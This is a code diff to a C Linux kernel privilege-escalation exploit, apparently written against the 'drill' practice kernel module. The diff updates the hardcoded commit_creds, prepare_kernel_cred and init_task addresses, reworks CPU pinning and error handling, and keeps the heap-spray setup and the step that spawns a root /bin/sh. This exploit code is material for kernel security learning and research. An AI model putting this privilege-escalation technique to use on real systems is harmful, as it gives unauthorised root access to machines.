@@ -39,9 +39,9 @@
 /* ============================== Kernel stuff ============================== */
 
 /* Addresses from System.map (no KASLR) */
-#define COMMIT_CREDS_PTR	0xffffffff810c3ea0lu
-#define PREPARE_KERNEL_CRED_PTR	0xffffffff810c4130lu
-#define INIT_TASK_PTR	0xffffffff82a0c940lu
+#define COMMIT_CREDS_PTR 0xffffffff81123b20lu
+#define PREPARE_KERNEL_CRED_PTR 0xffffffff81124080lu
+#define INIT_TASK_PTR 0xffffffff83411080lu
 
 typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
@@ -56,7 +56,7 @@ void root_it(void)
 
 /* ========================================================================== */
 
-void do_cpu_pinning(void)
+int do_cpu_pinning(void)
 {
 	int ret = 0;
 	cpu_set_t single_cpu;
@@ -67,10 +67,11 @@ void do_cpu_pinning(void)
 	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
 	if (ret != 0) {
 		perror("[-] sched_setaffinity");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 
 	printf("[+] pinned to CPU #0\n");
+	return EXIT_SUCCESS;
 }
 
 void run_sh(void)
@@ -93,11 +94,12 @@ void run_sh(void)
 	if (pid == 0) {
 		execve("/bin/sh", args, NULL); /* Should not return */
 		perror("[-] execve");
-		exit(EXIT_FAILURE);
-	}
+	} else {
+		if (wait(&status) < 0)
+			perror("[-] wait");
 
-	if (wait(&status) < 0)
-		perror("[-] wait");
+		printf("[+] /bin/sh finished\n");
+	}
 }
 
 void init_payload(char *p, size_t size)
@@ -154,8 +156,6 @@ int main(void)
 	/*
 	 * Prepare
 	 */
-	do_cpu_pinning();
-
 	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
 					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
@@ -170,8 +170,10 @@ int main(void)
 		perror("[-] open drill_act");
 		goto end;
 	}
-
 	printf("[+] drill_act is opened\n");
+
+	if (do_cpu_pinning() == EXIT_FAILURE)
+		goto end;
 
 	spray_fd = open("./foobar", O_CREAT, S_IRUSR | S_IWUSR);
 	if (spray_fd < 0) {
